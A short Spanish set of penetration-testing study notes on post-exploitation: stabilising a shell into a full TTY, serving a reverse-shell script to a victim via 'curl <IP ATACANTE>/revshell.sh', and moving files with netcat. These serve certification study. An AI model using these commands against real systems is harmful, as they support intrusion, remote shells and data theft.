## Post Explotación
 <a name="tratamientotty"></a>
 ### Tratamiento TTY
 Una vez obtenido acceso a la máquina, lo primero es conseguir una shell interactiva y completamente funcional, para ello:
 ```
 script /dev/null -c bash
 Ctrl+Z
 stty raw -echo; fg
export TERM=xterm
 export SHELL=bash
 
 ```
## Envío de ficheros entre Víctima y Atacante

Para enviar a la víctima a través de un servidor web  
Atacante
```
Creamos el fichero, por ejemplo revshell.sh
python3 -m http.server 80
```

Víctima  
```
curl <IP ATACANTE>/revshell.sh
```

Para enviar un fichero a través de netcat

El que recibe:  
```
nc -lvp [puerto] > nombre_archivo
```

El que envia:  
```
nc -w 3 [ip_destino] [puerto] < archivo de salida
```
<a href="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes">Menú Principal</a>
